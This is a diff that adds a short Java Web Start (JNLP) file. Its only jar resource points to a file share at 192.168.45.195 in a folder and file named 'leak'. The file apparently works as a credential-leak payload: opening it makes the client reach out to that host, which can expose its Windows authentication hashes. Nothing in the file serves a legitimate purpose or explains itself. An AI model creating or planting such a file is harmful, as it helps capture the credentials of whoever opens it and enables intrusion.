@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jnlp spec="1.0+" codebase="" href="">
+   <resources>
+      <jar href="file://192.168.45.195/leak/leak.jar"/>
+   </resources>
+   <application-desc/>
+</jnlp>
